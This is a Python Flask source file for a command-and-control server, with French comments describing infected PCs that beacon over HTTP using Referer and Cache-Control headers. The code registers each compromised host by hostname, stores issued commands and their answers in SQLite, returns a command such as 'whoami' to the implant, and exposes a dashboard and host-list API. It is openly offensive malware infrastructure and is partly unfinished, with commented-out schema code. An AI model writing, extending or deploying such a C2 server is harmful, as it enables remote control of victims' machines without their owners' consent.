#!/usr/bin/env python

from flask import Flask, request, render_template, jsonify
from flask_cors import CORS
import sqlite3
from sqlite3 import Error

app = Flask(__name__)

CORS(app, resources={r'/*': {'origins': '*'}})

"""
	> Un pc infecté envoie à interval régulier
		une requête HTTP vers le C2
		contenant les headers Referer et Cache-Control.

	[ Phase 1 ]
	> Il faut extraire le hostname depuis l'entête Referer


"""

# ===============================================
def create_connection(db_file):
	conn = None
	try:
		conn = sqlite3.connect(db_file)
		print("[i] Database connection ...OK")
	except Error as e:
		print(e)

	return conn
# ===============================================

# get db object
# ===============================================
def get_db():
	database = r"c2.db"
	conn = create_connection(database)
	return conn
# ===============================================

# select query
# ===============================================
def select_db(conn, sql, params):
	cursor = conn.cursor()
	cursor.execute(sql, params)
	rows = cursor.fetchall()

	return rows
# ===============================================

# insert statement
# ===============================================
def insert_db(conn, sql, params):
	cursor = conn.cursor()
	cursor.execute(sql, params)
	conn.commit()

	return cursor.lastrowid
# ===============================================





# create tables
# ===============================================
def create_table(conn, create_table_sql):
	try:
		c = conn.cursor()
		c.execute(create_table_sql)
	except Error as e:
		print(e)
# ===============================================




# insert new command in host history
# ===============================================
def insert_new_command(conn, cmd):
	sql = '''
		INSERT INTO commands_history(command, fk_host_id) VALUES (?,?)
	'''

	cursor = conn.cursor()
	cursor.execute(sql, cmd)
	conn.commit()

	return cursor.lastrowid
# ===============================================


# update status
# ===============================================
def update_command_status(conn, cmd):
	sql = '''
		UPDATE commands_history SET status = ?, answer = ? WHERE cmd_id = ?
	'''

	cursor = conn.cursor()
	cursor.execute(sql, cmd)
	conn.commit()

	return cursor.lastrowid
# ===============================================


# execute all together
# ===============================================
def main():
	database = r"c2.db"

	# create tables
	'''
	sql_create_hosts = """
		CREATE TABLE IF NOT EXISTS hosts (
			host_id INTEGER NOT NULL PRIMARY KEY,
			hostname TEXT NOT NULL
		);
	"""

	sql_create_cmdhistory = """
		CREATE TABLE IF NOT EXISTS commands_history (
			cmd_id INTEGER NOT NULL PRIMARY KEY,
			command TEXT NOT NULL,
			status INTEGER NULL,
			answer TEXT NULL,
			fk_host_id INTEGER NOT NULL,
			FOREIGN KEY (fk_host_id) REFERENCES hosts(host_id)
		);
	"""

	# create db conn
	conn = create_connection(database)

	# create tables
	if conn is not None:
		create_table(conn, sql_create_hosts)
		create_table(conn, sql_create_cmdhistory)
	else:
		print("Error! cannot create the database connection")
	'''

	conn = create_connection(database)
	with conn:
		'''
		hostname = ['super-pc']
		host_id = insert_host(conn, hostname)
		command = ('whoami', host_id)
		command_id = insert_new_command(conn, command)
		print(">success>")
		'''
		updatecmd = (1, "desktop-jc32", 1)
		req_updatecmd = update_command_status(conn, updatecmd)
		print("ok")

# ===============================================


# test database
# ===============================================
@app.route("/db")
def testdb():
	main()

	return "ok"
# ===============================================
















# ===============================================
# APP-RELATED FUNCTIONS
# ===============================================

# get hosts by hostname
# ===============================================
def get_one_host(conn, hostname):
# def get_one_host(conn, hostname, hash):
	sql = 'SELECT * FROM hosts WHERE hostname = ?'
	# sql = 'SELECT * FROM hosts WHERE hostname = ? AND hash = ?'
	results = select_db(conn, sql, (hostname,))

	return results
# ===============================================

# insert new host
# ===============================================
def insert_host(conn, hostname):
	sql = 'INSERT INTO hosts(hostname, hash) VALUES (?,?)'
	lastrowid = insert_db(conn, sql, (hostname, "default-hash"))

	return lastrowid
# ===============================================









@app.route("/")
def phase1():
	# print(request.headers.get("Referer"))
	referrer = request.referrer

	if referrer == None:
		return ""

	# remove the "host:" prefix + pop the "-00" and get core hostname
	hostname = referrer.split(':')[1].split('-')
	hostname.pop(-1)
	hostname = "-".join(hostname)
	print("== welcome %s ==" % (hostname))

	# get db connection
	conn = get_db()


	# check if cmds for hostname exists in db
	is_host_registered = get_one_host(conn, hostname)

	if len(is_host_registered) != 0:
		print("host already here, no cmd")
	else:
		print("[!] no host %s registered !" % (hostname))
		latest_id = insert_host(conn, hostname)
		if latest_id != None:
			print("[+] new host '%s' added to database with id=%s! " % (hostname, latest_id))



	# [...]
	latest_cmd = "whoami"

	# return "<RANDINT>--<HOSTNAME>--<CMD>"
	return "123--%s--%s" % (hostname, latest_cmd)
# ===============================================



# ===============================================
@app.route("/dashboard")
def dashboard():
	return render_template('dashboard.html')
# ===============================================


# ===============================================
@app.route("/api/hosts/list")
def getHosts():
	conn = get_db()

	hosts = select_db(conn, "SELECT * FROM hosts", ())
	return jsonify(hosts)
# ===============================================



